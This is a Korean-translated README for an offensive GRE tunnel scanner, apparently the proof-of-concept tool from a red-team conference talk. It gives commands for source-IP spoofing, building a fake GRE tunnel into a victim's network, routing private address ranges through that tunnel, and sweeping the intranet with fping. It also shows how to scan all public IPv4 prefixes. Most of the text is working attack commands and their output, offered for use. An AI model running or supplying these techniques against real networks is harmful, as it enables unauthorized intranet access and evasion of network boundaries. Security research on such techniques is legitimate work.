# GRE 터널 스캐너
## ⚠️⚠️⚠️ 중요 ⚠️⚠️⚠️
### ⚠️이 도구는 출발지 IP 주소 스푸핑을 포함합니다. 사용 전에 법적 허가를 받았는지 확인하십시오.⚠️
## 참고
- 이 코드는 강연: 스푸핑에서 터널링까지: 초기 접근과 회피를 위한 새로운 레드팀 네트워킹 기술의 PoC 코드입니다.
    - [Black Hat USA 2025 브리핑](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 메인 스테이지](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)
## 준비
- `pip3 install requirement.txt`
## 사용법
```
python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>
```
## 예제
- 예를 들어 `1.1.1.1`과 `2.2.2.2`가 gre 터널을 가지고 있을 때 당신은 `3.3.3.3`입니다
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1
```
- 그리고 GRE 터널을 악용하는 방법을 알아내기
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
- 엔드포인트는 알지만 피어 주소를 모를 경우 다음과 같이 할 수 있습니다
  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`
  - 올바른 피어를 얻으면서 8.8.8.8로부터 응답을 받게 됩니다

- 기본 설정은 초당 약 500 패킷입니다.
## 옵션
- `-sch`: 치트시트를 보여주고 종료 (발견한 -i -lh -s -d 입력 후 GRE 터널 명령어를 얻음)
- `-l3`: 레이어 3 터널 인터페이스 (기본값: False)
- `-r`: ICMP에 GRE 목적지 IP 정보 배치 (기본값: GRE 출발지 IP 정보 배치)
- `-ss`: 상태 파일 저장 및 사용 (마지막 스캔에서 이어서 시작) (기본값: False)
  - 대규모 스캔 시스템에서는 "on" 권장, 가끔 스크립트가 종료됨
- `-i <interface>`: 패킷을 보낼 인터페이스
- `-s <ip_or_file>`: GRE 출발지로 사용할 IP 서브넷 또는 IP(서브넷) 목록
- `-d <ip_or_file>`: GRE 목적지로 사용할 IP 서브넷 또는 IP(서브넷) 목록
- `-L <file>`: GRE 피어 목록 스캔
  - 파일의 각 줄은 `1.1.1.1,2.2.2.2` 형식
- `-lh <ip>`: 공개 인터페이스의 IP (-i 인터페이스의 IP)
- `-o <file>`: 로그 파일 경로
- `-t <float>`: GRE 패킷 전송 후 대기 시간(초) (기본값: 2)
- `-T <int>`: 동시에 GRE 패킷을 전송할 스레드 수 (기본값: 255)
- `-cs <int>`: 응답 대기 시작 전 전송할 IP 수 (기본값: 1000)
- `-dp`: 개인 IP GRE 스캔 (기본값: False)
- `-id <ip>`: ICMP 내부 목적지 주소 (기본값: GRE 목적지와 동일)
  - 내부 인트라넷 주소를 알고 있을 때 사용
- `-v <log_level>`: 로그 레벨 `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (기본값: INFO)
  - GRE 피어 발견 로그는 `CRITICAL` 레벨

## 전체 공개 IP를 더 잘 스캔하는 방법


```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss
```
## 실험실
### 데모 비디오
- [유튜브](https://youtu.be/DDvfYl5-J28)
### GRE 터널 스캔
`python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199`
### 인트라넷 접근 및 스캔

```
#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
### start scan intranet ###
fping -g 192.168.0.0/16

##### scan output #####
# 192.168.1.2 is alive

## test curl to web ##
curl 192.168.1.2
# YOU KNOW GRE!

#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```

## 면책 조항
이 프로젝트는 교육 및 연구 목적으로만 사용됩니다. 이 코드와 관련된 모든 행위 및 활동은 전적으로 귀하의 책임입니다. 저자 및 기여자는 이 프로젝트로 인한 오용이나 손해에 대해 책임을 지지 않습니다. 이 코드를 테스트, 사용 또는 배포하기 전에 적절한 권한이 있는지 반드시 확인하십시오. 무단 사용은 지역, 주 및 연방법을 위반할 수 있습니다.

## 라이선스
이 프로젝트는 MIT 라이선스 조건에 따라 라이선스가 부여됩니다.



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-10-11

---